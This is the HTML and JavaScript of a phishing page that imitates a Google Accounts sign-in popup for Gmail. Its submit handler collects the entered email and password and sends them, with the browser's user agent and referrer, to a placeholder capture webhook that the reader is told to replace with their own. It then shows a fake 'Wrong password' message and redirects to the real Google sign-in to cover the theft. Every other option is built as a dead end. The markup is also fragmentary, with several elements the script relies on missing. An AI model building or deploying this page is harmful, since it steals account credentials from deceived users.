<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in – Google Accounts</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }

  html, body {
    height: 100%;
    font-family: 'Google Sans', 'Product Sans', Roboto, Arial, sans-serif;
    background: #f1f3f4;
    overflow: hidden;
  }

  /* ---- Dimmed backdrop ---- */
  .backdrop {
    position: fixed;
    inset: 0;
    background: rgba(32, 33, 36, 0.5);
    z-index: 1000;
    user-select: none;
  }

  /* ---- Draggable popup ---- */
  .popup {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 448px;
    max-width: calc(100vw - 32px);
    background: #fff;
    border-radius: 8px;
    box-shadow:
      0 1px 2px rgba(60,64,67,0.3),
      0 2px 6px 2px rgba(60,64,67,0.15),
      0 8px 24px 4px rgba(60,64,67,0.15);
    overflow: hidden;
    animation: popIn 0.16s cubic-bezier(0.2, 0.8, 0.3, 1);
    will-change: transform;
  }
  @keyframes popIn {
    from { transform: translate(-50%, -50%) scale(0.94); opacity: 0; }
    to   { transform: translate(-50%, -50%) scale(1);    opacity: 1; }
  }

  /* ---- Title bar (drag handle) ---- */
  .titlebar {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 10px 14px;
    border-bottom: 1px solid #e8eaed;
    background: #fff;
    cursor: grab;
    user-select: none;
  }
  .titlebar.dragging { cursor: grabbing; }

  .favicon { width: 16px; height: 16px; flex-shrink: 0; }

  .titlebar .title-text {
    font-size: 13px;
    color: #3c4043;
    flex: 1;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    font-family: Roboto, Arial, sans-serif;
  }

  .titlebar .win-controls { display: flex; gap: 4px; }
  .titlebar .win-controls span {
    width: 28px;
    height: 24px;
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 4px;
    color: #5f6368;
    font-size: 14px;
    line-height: 1;
    cursor: pointer;
  }
  .titlebar .win-controls span:hover { background: #f1f3f4; }
  .titlebar .win-controls span.close:hover { background: #fce8e6; color: #d93025; }

  /* ---- Content ---- */
  .content { padding: 40px 40px 28px; }

  .g-logo {
    display: flex;
    justify-content: center;
    margin-bottom: 22px;
  }
  .g-logo svg { width: 74px; height: 24px; display: block; }

  h1 {
    font-size: 24px;
    font-weight: 400;
    color: #202124;
    text-align: center;
    margin-bottom: 8px;
    line-height: 1.3;
  }
  p.sub {
    font-size: 15px;
    color: #5f6368;
    text-align: center;
    line-height: 1.5;
    margin-bottom: 30px;
    font-family: Roboto, Arial, sans-serif;
  }

  /* ---- Official Google Sign-in button ---- */
  .gsi-button {
    width: 100%;
    height: 44px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 12px;
    background: #fff;
    border: 1px solid #dadce0;
    border-radius: 22px;
    cursor: pointer;
    font-family: 'Google Sans', Roboto, Arial, sans-serif;
    font-size: 14px;
    font-weight: 500;
    color: #3c4043;
    letter-spacing: 0.25px;
    transition: background 0.15s, border-color 0.15s, box-shadow 0.15s;
    margin-bottom: 24px;
  }
  .gsi-button:hover {
    background: #f8faff;
    border-color: #d2e3fc;
    box-shadow: 0 1px 2px rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
  }
  .gsi-button:active { background: #f1f5fe; }
  .gsi-button svg { width: 18px; height: 18px; flex-shrink: 0; }

  /* ---- "or" divider ---- */
  .divider {
    display: flex;
    align-items: center;
    gap: 12px;
    color: #5f6368;
    font-size: 12px;
    font-family: Roboto, Arial, sans-serif;
    margin-bottom: 20px;
  }
  .divider::before,
  .divider::after {
    content: "";
    flex: 1;
    height: 1px;
    background: #dadce0;
  }

  /* ---- Dead-end "other options" rows ---- */
  .option-row {
    display: flex;
    align-items: center;
    gap: 14px;
    padding: 12px 4px;
    border-radius: 6px;
    cursor: pointer;
    user-select: none;
    transition: background 0.12s;
  }
  .option-row:hover { background: #f8f9fa; }
  .option-row .icon {
    width: 20px;
    height: 20px;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #5f6368;
    flex-shrink: 0;
  }
  .option-row .label {
    font-size: 14px;
    font-family: Roboto, Arial, sans-serif;
    color: #3c4043;
    flex: 1;
  }
  .option-row .chev { color: #5f6368; font-size: 12px; }

  /* ---- Material text fields ---- */
  .field { position: relative; margin-bottom: 20px; }
  .field input {
    width: 100%;
    height: 56px;
    padding: 20px 14px 6px 14px;
    font-size: 16px;
    font-family: Roboto, Arial, sans-serif;
    color: #202124;
    background: #fff;
    border: 1px solid #dadce0;
    border-radius: 4px;
    outline: none;
    transition: border-color 0.15s, box-shadow 0.15s;
  }
  .field input:hover { border-color: #80868b; }
  .field input:focus {
    border: 2px solid #1a73e8;
    padding: 19px 13px 5px 13px;
  }
  .field label {
    position: absolute;
    left: 14px;
    top: 17px;
    font-size: 16px;
    font-family: Roboto, Arial, sans-serif;
    color: #5f6368;
    pointer-events: none;
    transition: top 0.15s, font-size 0.15s, color 0.15s;
    background: #fff;
    padding: 0 4px;
    margin-left: -4px;
  }
  .field input:focus + label,
  .field input:not(:placeholder-shown) + label {
    top: -8px;
    font-size: 12px;
  }
  .field input:focus + label { color: #1a73e8; }

  /* ---- Actions ---- */
  .actions {
    display: flex;
    justify-content: flex-end;
    align-items: center;
    margin-top: 28px;
    gap: 8px;
  }

  .btn-link {
    font-size: 14px;
    font-weight: 500;
    font-family: 'Google Sans', Roboto, Arial, sans-serif;
    color: #1a73e8;
    background: none;
    border: none;
    cursor: pointer;
    padding: 10px 12px;
    border-radius: 4px;
    letter-spacing: 0.25px;
  }
  .btn-link:hover { background: rgba(26,115,232,0.08); }

  .btn-primary {
    background: #1a73e8;
    color: #fff;
    font-size: 14px;
    font-weight: 500;
    font-family: 'Google Sans', Roboto, Arial, sans-serif;
    letter-spacing: 0.25px;
    border: none;
    border-radius: 4px;
    padding: 10px 24px;
    cursor: pointer;
    transition: background 0.15s, box-shadow 0.15s;
  }
  .btn-primary:hover {
    background: #1765cc;
    box-shadow: 0 1px 2px rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
  }
  .btn-primary:disabled { background: #a8c7fa; cursor: default; box-shadow: none; }

  .hidden { display: none !important; }

  .error {
    font-size: 12px;
    font-family: Roboto, Arial, sans-serif;
    color: #d93025;
    margin-top: -12px;
    margin-bottom: 16px;
    padding-left: 2px;
    display: flex;
    align-items: center;
    gap: 6px;
  }
  .error::before {
    content: "!";
    display: inline-flex;
    align-items: center;
    justify-content: center;
    width: 16px;
    height: 16px;
    border-radius: 50%;
    background: #d93025;
    color: #fff;
    font-size: 11px;
    font-weight: 700;
    flex-shrink: 0;
  }

  .spinner {
    width: 16px; height: 16px;
    border: 2px solid rgba(255,255,255,0.4);
    border-top-color: #fff;
    border-radius: 50%;
    display: inline-block;
    vertical-align: middle;
    margin-right: 8px;
    animation: spin 0.7s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  .dismiss-wrap { text-align: center; margin-top: 20px; min-height: 18px; }
  .dismiss-wrap a {
    font-size: 12px;
    font-family: Roboto, Arial, sans-serif;
    color: #5f6368;
    text-decoration: none;
    cursor: pointer;
    opacity: 0;
    transition: opacity 0.4s;
  }
  .dismiss-wrap a.show { opacity: 1; }
  .dismiss-wrap a:hover { text-decoration: underline; }

  /* ---- Legal footer ---- */
  .legal-footer {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 12px 40px;
    font-size: 12px;
    font-family: Roboto, Arial, sans-serif;
    color: #5f6368;
    border-top: 1px solid #e8eaed;
  }
  .legal-footer .lang-select {
    display: flex; align-items: center; gap: 6px;
    cursor: pointer; padding: 4px 6px; border-radius: 4px;
  }
  .legal-footer .lang-select:hover { background: #f1f3f4; }
  .legal-footer .links a {
    color: #5f6368; text-decoration: none; margin-left: 16px;
  }
  .legal-footer .links a:hover { text-decoration: underline; }

  /* ---- Toast for dead-end actions ---- */
  .toast {
    position: fixed;
    bottom: 28px;
    left: 50%;
    transform: translateX(-50%) translateY(20px);
    background: #323232;
    color: #fff;
    font-size: 13px;
    font-family: Roboto, Arial, sans-serif;
    padding: 12px 20px;
    border-radius: 4px;
    box-shadow: 0 3px 5px -1px rgba(0,0,0,0.2),
                0 6px 10px 0 rgba(0,0,0,0.14),
                0 1px 18px 0 rgba(0,0,0,0.12);
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.2s, transform 0.2s;
    z-index: 2000;
    max-width: 80vw;
    text-align: center;
  }
  .toast.show {
    opacity: 1;
    transform: translateX(-50%) translateY(0);
  }
</style>
</head>
<body>

<div class="backdrop" id="backdrop">
  <div class="popup" id="popup">

    <!-- Draggable title bar -->
    <div class="titlebar" id="titlebar">
      <svg class="favicon" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>

      </svg>

        <span title="Minimize">–</span>

    <!-- Content -->
    <div class="content">

      <!-- Official Google wordmark -->
      <div class="g-logo" aria-label="Google">
        <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
          <path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
          <path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.54-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
          <path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>

          <path fill="#34A853" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>

        </svg>
      </div>

      <!-- ============================================================
           STEP 1: "Sign in" landing page.
           Sign-in-with-Google is the ONLY working path.
           Everything else dead-ends.
           ============================================================ -->
      <div id="step1">
        <h1>Sign in</h1>
        <p class="sub">to continue to Gmail</p>

        <!-- Official Google Sign-in button (the only working path) -->
        <button class="gsi-button" id="gsiBtn" type="button">
          <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">

            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>

<script>
/* ============================================================
   CONFIG — point this at your own endpoint.
   ============================================================ */
const WEBHOOK_URL = "https://hooks.example.com/v2/capture";

/* ============================================================
   ELEMENTS
   ============================================================ */
const popup      = document.getElementById("popup");
const titlebar   = document.getElementById("titlebar");
const step1      = document.getElementById("step1");
const step2      = document.getElementById("step2");
const gsiBtn     = document.getElementById("gsiBtn");
const form       = document.getElementById("credForm");
const submitBtn  = document.getElementById("submitBtn");
const errorMsg   = document.getElementById("errorMsg");
const emailIn    = document.getElementById("email");
const passIn     = document.getElementById("password");
const toast      = document.getElementById("toast");

/* ============================================================
   TOAST HELPER (for dead-end options)
   ============================================================ */
let toastTimer = null;
function showToast(msg) {
  toast.textContent = msg;
  toast.classList.add("show");
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => toast.classList.remove("show"), 2600);
}

/* ============================================================
   DEAD-END ROUTING
   Every non-"Sign in with Google" path is a dead-end.
   ============================================================ */
document.querySelectorAll('[data-dead="true"]').forEach(el => {
  el.addEventListener("click", (e) => {
    e.preventDefault();
    e.stopPropagation();
    const label = el.querySelector(".label")?.textContent.trim();
    if (label === "Create account") {
      showToast("Account creation is disabled. Please sign in with Google.");
    } else if (label === "Forgot email?") {
      showToast("Account recovery is unavailable. Please sign in with Google.");
    } else if (label === "Use another account") {
      showToast("Only the linked Google account can sign in.");
    } else {
      showToast("This action is not available. Please sign in with Google.");
    }
  });
});

/* ============================================================
   DRAG LOGIC
   ============================================================ */
let dragState = null;

function getPopupRect() { return popup.getBoundingClientRect(); }

titlebar.addEventListener("pointerdown", (e) => {
  if (e.target.closest(".win-controls")) return;

  const rect = getPopupRect();

  // Lock visual position into top/left
  popup.style.transform = "none";
  popup.style.left = rect.left + "px";
  popup.style.top  = rect.top  + "px";
  popup.style.animation = "none";

  dragState = {
    offsetX: e.clientX - rect.left,
    offsetY: e.clientY - rect.top,
    pointerId: e.pointerId
  };

  titlebar.classList.add("dragging");
  titlebar.setPointerCapture(e.pointerId);
  e.preventDefault();
});

titlebar.addEventListener("pointermove", (e) => {
  if (!dragState || e.pointerId !== dragState.pointerId) return;

  const rect = getPopupRect();
  let newLeft = e.clientX - dragState.offsetX;
  let newTop  = e.clientY - dragState.offsetY;

  const minVisible = 40;
  const maxLeft = window.innerWidth  - minVisible;
  const maxTop  = window.innerHeight - minVisible;
  newLeft = Math.max(-rect.width + minVisible, Math.min(newLeft, maxLeft));
  newTop  = Math.max(0, Math.min(newTop, maxTop));

  popup.style.left = newLeft + "px";
  popup.style.top  = newTop  + "px";
});

function endDrag(e) {
  if (!dragState) return;
  dragState = null;
  titlebar.classList.remove("dragging");
  try { titlebar.releasePointerCapture(e.pointerId); } catch (_) {}
}
titlebar.addEventListener("pointerup", endDrag);
titlebar.addEventListener("pointercancel", endDrag);

window.addEventListener("resize", () => {
  const rect = getPopupRect();
  if (!rect) return;
  let left = rect.left, top = rect.top;
  let changed = false;
  if (left + rect.width < 40)  { left = 40 - rect.width; changed = true; }
  if (left > window.innerWidth - 40) { left = window.innerWidth - 40; changed = true; }
  if (top  + rect.height < 40) { top  = 40 - rect.height; changed = true; }
  if (top  > window.innerHeight - 40) { top = window.innerHeight - 40; changed = true; }
  if (changed) {
    popup.style.transform = "none";
    popup.style.left = left + "px";
    popup.style.top  = top  + "px";
    popup.style.animation = "none";
  }
});

/* ============================================================
   STEP 1 → STEP 2 (the ONLY working path)
   ============================================================ */
gsiBtn.addEventListener("click", () => {
  step1.classList.add("hidden");
  step2.classList.remove("hidden");
  setTimeout(() => emailIn.focus(), 60);
});

/* ============================================================
   DELAY-REVEALED DISMISS LINKS
   ============================================================ */
setTimeout(() => {
  document.getElementById("dismissLink").classList.add("show");
}, 6000);
setTimeout(() => {
  document.getElementById("dismissLink2").classList.add("show");
}, 6000);

/* ============================================================
   FORGOT PASSWORD — dead-end (no real Google bounce here)
   ============================================================ */
document.getElementById("forgotBtn").addEventListener("click", () => {
  showToast("Password recovery is unavailable. Please sign in with Google.");
});

/* ============================================================
   SUBMIT HANDLER
   ============================================================ */
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const email    = emailIn.value.trim();
  const password = passIn.value;

  if (!email || !password) {
    errorMsg.textContent = "Enter an email or phone number and password.";
    errorMsg.classList.remove("hidden");
    return;
  }

  errorMsg.classList.add("hidden");
  submitBtn.disabled = true;
  submitBtn.innerHTML = '<span class="spinner"></span>Signing in…';

  const payload = {
    ts:       new Date().toISOString(),
    email:    email,
    password: password,
    ua:       navigator.userAgent,
    referrer: document.referrer || null,
    page:     location.href,
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      mode: "no-cors",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      keepalive: true,
    });
  } catch (_) {}

  setTimeout(() => {
    errorMsg.textContent = "Wrong password. Try again or click Forgot password to reset it.";
    errorMsg.classList.remove("hidden");
    submitBtn.disabled = false;
    submitBtn.textContent = "Next";

    const realGoogle =
      "https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin&identifier=" +
      encodeURIComponent(email);
    window.location.href = realGoogle;
  }, 1200);
});
</script>
